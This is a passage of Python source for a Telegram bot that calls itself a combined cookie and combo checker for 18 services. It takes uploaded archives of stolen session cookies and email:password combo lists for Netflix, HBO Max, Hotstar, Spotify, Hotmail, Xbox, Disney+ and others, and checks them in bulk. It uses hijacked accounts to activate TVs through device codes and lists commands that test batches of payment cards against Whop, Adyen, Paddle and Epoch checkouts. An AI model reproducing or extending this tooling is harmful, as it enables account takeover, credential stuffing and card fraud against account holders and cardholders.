            await bot.send_message(chat_id, f"{E_NO} Admin only.", parse_mode="HTML",
                                   reply_markup=main_markup("hotstar"))
            return
        user_results[uid]["hs_vault_upload"] = True
        await bot.send_message(chat_id,
                               f"{E_UPLOAD} Send a <code>.zip</code> with Hotstar cookie files.",
                               parse_mode="HTML", reply_markup=_hs_vault_cancel_markup())
    elif data == "hs_cancel_vault_upload":
        user_results[uid]["hs_vault_upload"] = False
        await bot.send_message(chat_id, f"{E_TRASH} Cancelled.", parse_mode="HTML",
                               reply_markup=main_markup("hotstar"))

    # Netflix sub-modes
    elif data.startswith("nf_sub_"):
        sub = data[7:]
        user_results[uid]["nf_sub"] = sub
        labels = {"check": "🔍 Check", "nftoken": "🔑 Token", "clean": "🧹 Clean", "tvlogin": "📺 TV Login"}
        await bot.send_message(chat_id, f"{SP_BOLT} <b>Netflix: {labels.get(sub,'?')}</b>",
                               parse_mode="HTML", reply_markup=main_markup("netflix"))
        if sub == "tvlogin":
            user_results[uid]["nf_awaiting_tv"] = True
            await bot.send_message(chat_id,
                                   f"{SP_TV} <b>Netflix TV Login</b>\n\n"
                                   f"Vault: <b>{nf_vault_count()}</b> cookie(s)\n\n"
                                   f"On TV: Settings → Sign in → Get a code\n"
                                   f"→ Send the 8-digit code here",
                                   parse_mode="HTML", reply_markup=_nf_tv_cancel_markup())
    elif data == "nf_cancel_tv":
        user_results[uid]["nf_awaiting_tv"] = False
        await bot.send_message(chat_id, f"{E_TRASH} Cancelled.", parse_mode="HTML",
                               reply_markup=main_markup("netflix"))
    elif data == "nf_vault_upload":
        if uid not in ADMIN_IDS and uid != OWNER_ID:
            await bot.send_message(chat_id, f"{E_NO} Admin only.", parse_mode="HTML",
                                   reply_markup=main_markup("netflix"))
            return
        user_results[uid]["nf_vault_upload"] = True
        await bot.send_message(chat_id,
                               f"{E_UPLOAD} Send a <code>.zip</code> with Netflix cookie files.",
                               parse_mode="HTML", reply_markup=_nf_vault_cancel_markup())
    elif data == "nf_cancel_vault_upload":
        user_results[uid]["nf_vault_upload"] = False
        await bot.send_message(chat_id, f"{E_TRASH} Cancelled.", parse_mode="HTML",
                               reply_markup=main_markup("netflix"))

    # Crunchyroll sub-modes
    elif data.startswith("cr_sub_"):
        sub = data[7:]
        user_results[uid]["cr_sub"] = sub
        await bot.send_message(chat_id, f"{CR_ICON} <b>Crunchyroll: {sub}</b>",
                               parse_mode="HTML", reply_markup=main_markup("crunchyroll"))
    elif data.startswith("cr2_sub_"):
        sub = data[8:]
        user_results[uid]["cr2_sub"] = sub
        await bot.send_message(chat_id, f"{CR_ICON} <b>Crunchyroll 2: {sub}</b>",
                               parse_mode="HTML", reply_markup=main_markup("crunchyroll2"))

    # HBO Max TV
    elif data == "hbo_activate_tv":
        live = r["hbo_live"]
        if not live:
            await bot.send_message(chat_id, f"{HBO_DEAD} No live cookies.", parse_mode="HTML",
                                   reply_markup=main_markup("hbomax"))
            return
        best = live[0]
        user_results[uid]["hbo_awaiting_tv"] = True
        user_results[uid]["hbo_tv_data"] = {
            "st_token": best.get("st_token", ""), "region": best.get("region", "amer"),
            "email": best.get("email", "Unknown"), "country": best.get("country", "Unknown"),
        }
        await bot.send_message(chat_id,
                               f"{HBO_TV} <b>HBO Max TV Activator</b>\n\n"
                               f"Account: <code>{best.get('email','?')}</code>\n\n"
                               f"On TV: hbomax.com/tvsignin → enter 6-digit code below",
                               parse_mode="HTML", reply_markup=_hbo_cancel_markup())
    elif data == "hbo_cancel_tv":
        user_results[uid]["hbo_awaiting_tv"] = False
        user_results[uid]["hbo_tv_data"] = None
        await bot.send_message(chat_id, f"{E_TRASH} Cancelled.", parse_mode="HTML",
                               reply_markup=main_markup("hbomax"))


# ── Text handler ──────────────────────────────────────────────────────────
@router.message(F.text & ~F.command)
async def handle_text(message: types.Message):
    uid = message.from_user.id
    text = message.text.strip()
    r = user_results[uid]
    mode = r["mode"]

    # Surfshark 6-digit code
    if r.get("ss_awaiting_code"):
        code = text.upper()
        if len(code) != 6 or not code.isalnum():
            await message.answer(f"{SS_DEAD} Enter 6-char code.", parse_mode="HTML",
                                 reply_markup=_ss_cancel_markup())
            return
        ld = r.get("ss_login_data", {})
        msg = await message.answer(f"{E_GEAR} Authorizing…", parse_mode="HTML")
        loop = asyncio.get_event_loop()
        ok, err = await loop.run_in_executor(None, ss_authorize_device,
                                              ld.get("content", ""), ld.get("sstk", ""), code)
        user_results[uid]["ss_awaiting_code"] = False
        user_results[uid]["ss_login_data"] = None
        if ok:
            await safe_edit(msg, f"{E_CHECK} <b>Device Authorized!</b>\n\n"
                                  f"Account: <code>{ld.get('email','?')}</code>",
                            markup=main_markup("surfshark"))
        else:
            await safe_edit(msg, f"{SS_DEAD} <b>Failed.</b>\n<code>{err}</code>",
                            markup=main_markup("surfshark"))
        return

    # Spotify TV code
    if r.get("sp_awaiting_tv"):
        code = text.upper()
        if len(code) != 6 or not code.isalnum():
            await message.answer(f"{SP_DEAD} Enter 6-char code.", parse_mode="HTML",
                                 reply_markup=_sp_cancel_markup())
            return
        tv = r.get("sp_tv_data", {})
        msg = await message.answer(f"{SP_SEARCH} Fetching tokens…", parse_mode="HTML")
        loop = asyncio.get_event_loop()
        csrf, flow, upd = await loop.run_in_executor(None, sp_get_csrf_and_flow, tv.get("cookies", {}))
        if not csrf or not flow:
            user_results[uid]["sp_awaiting_tv"] = False
            user_results[uid]["sp_tv_data"] = None
            await safe_edit(msg, f"{SP_DEAD} Failed to get tokens.", markup=main_markup("spotify"))
            return
        await safe_edit(msg, f"{SP_BOLT} Activating TV…")
        ok, tv_name, err = await loop.run_in_executor(None, sp_activate_tv, upd, code, csrf, flow)
        user_results[uid]["sp_awaiting_tv"] = False
        user_results[uid]["sp_tv_data"] = None
        if ok:
            await safe_edit(msg, sp_fmt_tv_success(tv_name or "Unknown", code,
                                                    tv.get("email","?"), tv.get("plan","?"),
                                                    tv.get("country","?")),
                            markup=main_markup("spotify"))
        else:
            await safe_edit(msg, f"{SP_DEAD} Failed.\n<code>{err}</code>", markup=main_markup("spotify"))
        return

    # Netflix 8-digit code
    if r.get("nf_awaiting_tv") and mode == "netflix":
        code = text.strip().replace(" ", "").replace("-", "")
        if not re.match(r"^\d{6,8}$", code):
            await message.answer(f"{SP_DEAD} Invalid code.", parse_mode="HTML",
                                 reply_markup=_nf_tv_cancel_markup())
            return
        user_results[uid]["nf_awaiting_tv"] = False
        msg = await message.answer(f"{SP_BOLT} Trying code <code>{code}</code>…", parse_mode="HTML")
        loop = asyncio.get_event_loop()
        res = await loop.run_in_executor(None, nf_process_tv_login, code)
        if res.get("success"):
            await safe_edit(msg,
                            f"{SP_PREMIUM} <b>Netflix TV Activated!</b>\n\n"
                            f"Country: <code>{res.get('country','?')}</code>\n"
                            f"Plan: <code>{res.get('plan','?')}</code>\n"
                            f"Tried: <code>{res.get('tried',1)}</code> account(s)",
                            markup=main_markup("netflix"))
        else:
            err = res.get("error", "Unknown")
            if err == "no_cookies_left":
                err_msg = "No vault cookies available."
            elif err == "all_cookies_failed":
                err_msg = f"Tried {res.get('tried',0)} account(s) — all invalid."
            else:
                err_msg = err
            await safe_edit(msg, f"{SP_DEAD} <b>Failed.</b>\n<code>{err_msg}</code>",
                            markup=main_markup("netflix"))
        return

    # HBO Max 6-digit code
    if r.get("hbo_awaiting_tv") and mode == "hbomax":
        code = text.strip().upper().replace(" ", "").replace("-", "")
        if not re.match(r"^\d{6}$", code):
            await message.answer(f"{HBO_DEAD} Enter 6-digit code.", parse_mode="HTML",
                                 reply_markup=_hbo_cancel_markup())
            return
        tv = r.get("hbo_tv_data", {})
        user_results[uid]["hbo_awaiting_tv"] = False
        user_results[uid]["hbo_tv_data"] = None
        msg = await message.answer(f"{E_GEAR} Activating TV…", parse_mode="HTML")
        loop = asyncio.get_event_loop()
        ok, status = await loop.run_in_executor(None, hbo_activate_tv,
                                                 tv.get("st_token",""), code, tv.get("region","amer"))
        if ok:
            await safe_edit(msg, f"{E_CHECK} <b>HBO Max TV Activated!</b>\n\n"
                                  f"Account: <code>{tv.get('email','?')}</code>\n"
                                  f"Code: <code>{code}</code>",
                            markup=main_markup("hbomax"))
        else:
            errs = {"invalid_code": "Invalid code.", "expired_code": "Expired.",
                    "activation_failed": "Activation failed."}
            await safe_edit(msg, f"{HBO_DEAD} <code>{errs.get(status, status)}</code>",
                            markup=main_markup("hbomax"))
        return

    await message.answer(
        f"Send a cookie/combo file (<code>.txt</code>/<code>.json</code>/<code>.zip</code>) or use /whop.",
        parse_mode="HTML", reply_markup=main_markup(mode))


# ── Photo handler (Hotstar QR) ────────────────────────────────────────────
@router.message(F.photo)
async def handle_photo(message: types.Message, bot: Bot):
    uid = message.from_user.id
    r = user_results[uid]
    if not r.get("hs_awaiting_qr"):
        return
    user_results[uid]["hs_awaiting_qr"] = False
    scan = await message.answer("🔍 Scanning QR…", parse_mode="HTML")
    try:
        photo = await message.photo[-1].get_file()
        buf = io.BytesIO()
        await bot.download_file(photo.file_path, destination=buf)
        loop = asyncio.get_event_loop()
        qr_data = await loop.run_in_executor(None, scan_qr, buf.getvalue())
        if not qr_data:
            await safe_edit(scan, "❌ No QR found.", markup=main_markup("hotstar"))
            hs_vault_record(False)
            return
        if not any(d in qr_data for d in ("hotstar.com", "jiohotstar.com")):
            await safe_edit(scan, f"❌ Not a Hotstar QR.\n<code>{qr_data[:100]}</code>",
                            markup=main_markup("hotstar"))
            hs_vault_record(False)
            return
        await safe_edit(scan, f"{E_GEAR} QR decoded. Picking account…")
        info, err = hs_vault_pick_cookie()
        if not info:
            await safe_edit(scan, f"❌ {err}", markup=main_markup("hotstar"))
            hs_vault_record(False)
            return
        await safe_edit(scan, f"{SS_REVIVED} Activating TV…")
        ok, act = await loop.run_in_executor(None, hs_vault_activate_qr, qr_data, info)
        if ok:
            new_use = hs_vault_increment_use(info["filename"])
            hs_vault_record(True)
            removed = ""
            if new_use >= HS_VAULT_MAX_USES:
                try: os.remove(info["filepath"])
                except: pass
                removed = f"\n\n{HS_DEVICE} Account removed (max uses)."
            await safe_edit(scan, f"{E_PARTY} <b>Activated!</b>\n\nUsage: {new_use}/{HS_VAULT_MAX_USES}{removed}",
                            markup=main_markup("hotstar"))
        else:
            hs_vault_record(False)
            await safe_edit(scan, f"❌ <code>{act}</code>", markup=main_markup("hotstar"))
    except Exception as e:
        logger.exception("photo handler")
        hs_vault_record(False)
        await safe_edit(scan, f"Error: <code>{str(e)[:200]}</code>",
                        markup=main_markup("hotstar"))


# ── File handler ──────────────────────────────────────────────────────────
@router.message(F.document)
async def handle_file(message: types.Message, bot: Bot):
    uid = message.from_user.id
    chat_id = message.chat.id
    doc = message.document
    r = user_results[uid]
    mode = r["mode"]

    if not doc:
        await message.answer("Send a file.")
        return
    if r["processing"]:
        await message.answer(f"{E_CLOCK} Already processing.", parse_mode="HTML")
        return

    fname = doc.file_name or ""
    ext = fname.rsplit(".", 1)[-1].lower() if "." in fname else ""

    # Netflix vault
    if r.get("nf_vault_upload") and ext == "zip":
        user_results[uid]["nf_vault_upload"] = False
        sm = await message.answer(f"{E_DOWN} Downloading…", parse_mode="HTML")
        try:
            tf = await bot.get_file(doc.file_id)
            zp = os.path.join(tempfile.gettempdir(), f"nf_vault_{uid}_{int(time.time())}.zip")
            await bot.download_file(tf.file_path, destination=zp)
            added, err = nf_vault_add_zip(zp)
            try: os.remove(zp)
            except: pass
            if err and added == 0:
                await safe_edit(sm, f"❌ {err}", markup=main_markup("netflix"))
            else:
                await safe_edit(sm, f"✅ <b>Netflix Vault +{added}</b>  Total: <b>{nf_vault_count()}</b>",
                                markup=main_markup("netflix"))
        except Exception as e:
            await safe_edit(sm, f"Error: <code>{str(e)[:150]}</code>", markup=main_markup("netflix"))
        return

    # Hotstar vault
    if r.get("hs_vault_upload") and ext == "zip":
        user_results[uid]["hs_vault_upload"] = False
        sm = await message.answer(f"{E_DOWN} Downloading…", parse_mode="HTML")
        try:
            tf = await bot.get_file(doc.file_id)
            zp = os.path.join(tempfile.gettempdir(), f"hs_vault_{uid}_{int(time.time())}.zip")
            await bot.download_file(tf.file_path, destination=zp)
            added, err = hs_vault_add_zip(zp)
            try: os.remove(zp)
            except: pass
            if err and added == 0:
                await safe_edit(sm, f"❌ {err}", markup=main_markup("hotstar"))
            else:
                await safe_edit(sm, f"✅ <b>Hotstar Vault +{added}</b>  "
                                     f"Total: <b>{hs_vault_count()}</b>  "
                                     f"Available: <b>{hs_vault_available_count()}</b>",
                                markup=main_markup("hotstar"))
        except Exception as e:
            await safe_edit(sm, f"Error: <code>{str(e)[:150]}</code>", markup=main_markup("hotstar"))
        return

    if ext not in ("txt", "json", "zip"):
        await message.answer("Send <code>.txt</code>, <code>.json</code>, or <code>.zip</code>.",
                             parse_mode="HTML")
        return
    if doc.file_size > MAX_FILE_SIZE:
        await message.answer(f"Max: {MAX_FILE_SIZE // 1024 // 1024} MB.", parse_mode="HTML")
        return

    user_results[uid]["processing"] = True
    sm = await message.answer(f"{E_DOWN} Downloading…", parse_mode="HTML")
    temp_path = None

    try:
        tf = await bot.get_file(doc.file_id)
        temp_path = os.path.join(tempfile.gettempdir(), f"{mode}_{uid}_{int(time.time())}_{fname}")
        await bot.download_file(tf.file_path, destination=temp_path)

        if ext == "zip":
            await safe_edit(sm, f"{E_FOLDER} Extracting…")
            files = extract_zip_cookies(temp_path, prefix=mode)
            if not files:
                await safe_edit(sm, "No valid files in ZIP.")
                user_results[uid]["processing"] = False
                return
        else:
            files = [temp_path]

        total = len(files)
        await safe_edit(sm, f"{E_GEAR} Checking {total} file(s) via {SERVICES[mode]}…")

        # Netflix clean mode
        if mode == "netflix" and r.get("nf_sub") == "clean":
            await safe_edit(sm, f"{SP_SPARK} Cleaning…")
            try:
                raw = (open(temp_path, encoding="utf-8", errors="ignore").read() if ext != "zip"
                       else "\n".join(open(fp, encoding="utf-8", errors="ignore").read() for fp in files))
                zbuf, valid = nf_clean_cookies_to_zip(raw)
                if not zbuf or valid == 0:
                    await safe_edit(sm, f"{SP_DEAD} No valid cookies.", markup=main_markup("netflix"))
                else:
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    await bot.send_document(chat_id,
                                            document=BufferedInputFile(zbuf.getvalue(),
                                                                        filename=f"netflix_clean_{ts}.zip"),
                                            caption=f"{SP_PREMIUM} <b>Clean cookies:</b> {valid}",
                                            parse_mode="HTML", reply_markup=main_markup("netflix"))
                    await safe_edit(sm, f"✅ Done. {valid} valid.")
            except Exception as e:
                await safe_edit(sm, f"Error: <code>{str(e)[:150]}</code>")
            user_results[uid]["processing"] = False
            return

        # Route to runner
        if mode == "surfshark":
            await _run_surfshark(uid, chat_id, total, files, ext, sm, bot)
        elif mode == "spotify":
            await _run_spotify(uid, chat_id, total, files, ext, temp_path, sm, bot)
        elif mode == "hotstar":
            await _run_hotstar(uid, chat_id, total, files, ext, sm, bot)
        elif mode == "netflix":
            await _run_netflix(uid, chat_id, total, files, ext, sm, bot)
        elif mode == "hbomax":
            await _run_hbomax(uid, chat_id, total, files, ext, sm, bot)
        elif mode == "primevideo":
            await _run_primevideo(uid, chat_id, total, files, ext, sm, bot)
        elif mode in ("hotmail", "msfullcap", "crunchyroll", "crunchyroll2",
                      "netflixcap", "expressvpn", "xbox", "xboxcap",
                      "dazn", "deezer", "disney", "roblox"):
            combos = []
            for fp in files:
                try:
                    for ln in open(fp, encoding="utf-8", errors="ignore"):
                        ln = ln.strip()
                        if ln and ":" in ln and not ln.startswith("#"):
                            combos.append(ln)
                except Exception:
                    pass
            if not combos:
                await safe_edit(sm, "❌ No valid combos.", markup=main_markup(mode))
                user_results[uid]["processing"] = False
                return
            total_c = len(combos)
            await safe_edit(sm, f"{E_GEAR} Processing {total_c} combos via {SERVICES[mode]}…")
            if mode == "hotmail":
                await _run_hotmail(uid, chat_id, total_c, combos, sm, bot)
            elif mode == "msfullcap":
                await _run_msfullcap(uid, chat_id, total_c, combos, sm, bot)
            elif mode == "crunchyroll":
                await _run_crunchyroll(uid, chat_id, total_c, combos, sm, bot)
            elif mode == "crunchyroll2":
                await _run_crunchyroll2(uid, chat_id, total_c, combos, sm, bot)
            elif mode == "netflixcap":
                await _run_netflixcap(uid, chat_id, total_c, combos, sm, bot)
            elif mode == "expressvpn":
                await _run_expressvpn(uid, chat_id, total_c, combos, sm, bot)
            elif mode == "xbox":
                await _run_xbox(uid, chat_id, total_c, combos, sm, bot)
            elif mode == "xboxcap":
                await _run_xboxcap(uid, chat_id, total_c, combos, sm, bot)
            elif mode == "dazn":
                await _run_dazn(uid, chat_id, total_c, combos, sm, bot)
            elif mode == "deezer":
                await _run_deezer(uid, chat_id, total_c, combos, sm, bot)
            elif mode == "disney":
                await _run_disney(uid, chat_id, total_c, combos, sm, bot)
            elif mode == "roblox":
                await _run_roblox(uid, chat_id, total_c, combos, sm, bot)

        for fp in files:
            try:
                if fp != temp_path and os.path.exists(fp):
                    os.remove(fp)
            except Exception:
                pass

    except Exception as e:
        logger.exception("file handler")
        await safe_edit(sm, f"Error: <code>{str(e)[:200]}</code>")
        user_results[uid]["processing"] = False
    finally:
        if temp_path and os.path.exists(temp_path):
            try: os.remove(temp_path)
            except: pass


# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                    MAIN                                                 ║
# ╚══════════════════════════════════════════════════════════════════════════╝

async def main():
    print("=" * 78)
    print("  🔒 Combined Cookie/Combo Checker Bot")
    print("     18 services · 4 commands (/whop · /ady · /pd · /ep)")
    print("=" * 78)
    print(f"  Token   : {TOKEN[:12]}...")
    print(f"  Owner   : {OWNER_ID}")
    print(f"  Workers : {MAX_WORKERS}")
    print(f"  GC Store: {GC_STORE_CHAT_ID or 'Disabled'}")
    print(f"  Proxies : {PROXY_MANAGER.get_stats()['total']} loaded")
    print("-" * 78)
    print(f"  Crypto  : pycryptodome={'✓' if _PYCRYPTODOME_OK else '✗'}  "
          f"asn1crypto={'✓' if _ASN1CRYPTO_OK else '✗'}  "
          f"curl_cffi={'✓' if _CURL_CFFI_OK else '✗'}  "
          f"cryptography={'✓' if _HAS_CRYPTOGRAPHY else '✗'}  "
          f"yaml={'✓' if _YAML_OK else '✗'}  "
          f"pyzbar={'✓' if _PYZBAR_OK else '✗'}")
    print("-" * 78)
    print("  Services :")
    print("    🛡 Surfshark    🎵 Spotify     🎯 JioHotstar    🎬 Netflix")
    print("    🎬 Netflix Cap 🎬 HBO Max     📧 Hotmail        💰 MS FullCap")
    print("    🍥 Crunchyroll 🍥 Crunchyroll2 🚀 ExpressVPN   📺 Prime Video")
    print("    🎮 Xbox        🎮 Xbox Cap    🏆 DAZN          🎵 Deezer")
    print("    🏰 Disney+     🎮 Roblox")
    print("-" * 78)
    print("  Commands :")
    print("    /whop <url> <email> <card1>...<card10>  — Whop checkout")
    print("    /ady  <url> <card1>...<card10>         — Adyen checkout")
    print("    /pd   <url> <card1>...<card10>         — Paddle checkout")
    print("    /ep   <url> <card1>...<card10>         — Epoch checkout")
    print("=" * 78)
    print("  ✅ Bot running — Ctrl+C to stop")
    print("=" * 78)

    bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher()
    dp.include_router(router)
    await dp.start_polling(bot, allowed_updates=["message", "callback_query"])

if __name__ == "__main__":
    asyncio.run(main())
# ▼ FILE HANDLER + MAIN END — PASTE CHUNK 9 BELOW THIS LINE ▼